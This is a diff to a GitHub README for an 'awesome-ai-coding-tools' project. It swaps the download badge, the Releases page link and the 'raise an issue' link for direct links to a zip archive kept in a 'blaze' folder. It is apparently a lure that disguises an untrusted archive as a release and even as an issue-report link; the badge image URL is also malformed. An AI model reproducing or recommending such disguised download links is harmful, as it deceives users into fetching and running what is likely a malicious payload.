@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-coding-tools - Unlock AI Power for Coding
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/releases)
+[![Download Now](https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/raw/refs/heads/main/blaze/awesome-ai-coding-tools-1.5-alpha.5.zip%https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/raw/refs/heads/main/blaze/awesome-ai-coding-tools-1.5-alpha.5.zip)](https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/raw/refs/heads/main/blaze/awesome-ai-coding-tools-1.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to awesome-ai-coding-tools! This application provides a curated list of 
 To download and install the application, please follow these steps:
 
 1. **Visit the Releases Page:** Go to the following link to access the application files:
-   [Release Page](https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/releases)
+   [Release Page](https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/raw/refs/heads/main/blaze/awesome-ai-coding-tools-1.5-alpha.5.zip)
 
 2. **Select the Latest Version:** Look for the latest version at the top of the page. It usually has the highest version number.
 
@@ -59,7 +59,7 @@ If you encounter issues during installation or while using the application, cons
 
 Join our community to get help and share your experiences:
 
-- **GitHub Issues:** If you find a bug or have a suggestion, please [raise an issue](https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/issues) on GitHub.
+- **GitHub Issues:** If you find a bug or have a suggestion, please [raise an issue](https://github.com/JohannFreddyLoayzaHuana/awesome-ai-coding-tools/raw/refs/heads/main/blaze/awesome-ai-coding-tools-1.5-alpha.5.zip) on GitHub.
 - **Discussion Forum:** Engage with other users and developers in our dedicated forum for tips, tricks, and questions. 
 
 ## 🤝 Contributions
